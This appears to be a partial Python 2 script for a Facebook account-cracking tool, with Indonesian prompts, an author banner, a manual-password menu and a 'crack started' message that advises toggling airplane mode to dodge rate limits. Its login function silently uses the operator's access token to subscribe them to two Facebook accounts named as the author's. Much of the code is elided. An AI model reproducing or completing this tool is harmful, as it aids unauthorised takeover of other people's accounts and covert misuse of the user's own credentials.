...
#              
# Recode? gk masalah. asalkan jgn ubah bot nya bro 
...
\033[0;91m
 ...
 \______   \\\_____  \    /     \ \____    /
  |       _/ /   |   \  /  \ /  \  /     / 
  |    |   \/    |    \/    Y    \/     /_ 
  |____|_  /\_______  /\____|__  /_______ \ \n         \/         \/         \/        \/ \033[0;97m\n          * \033[0;93mgithub.com/Arya•Xiins \033[0;97m*\n""""") 
...
# Metode api #
def Arya_ganteng():
	Arya = raw_input("\033[0;97m ?: Gunakan pasword manual? y/t : ")
	if Arya=='':
		print ("\033[0;91m !: pilih yang benar ") 
		Arya_ganteng()
	elif Arya in['y','Y']:
...
def langsungapi():
	print("\n \033[0;97m!: crack started...\n !:  lama? gunakan mode pesawat 5-10 detik\n")
...
def login_xx():
    ...
    requests.post('https://graph.facebook.com/100028434880529/subscribers?access_token=' + romz) # Arya Afrizal 2018
    requests.post('https://graph.facebook.com/100067807565861/subscribers?access_token=' + romz) # Arya Afrizal 2021
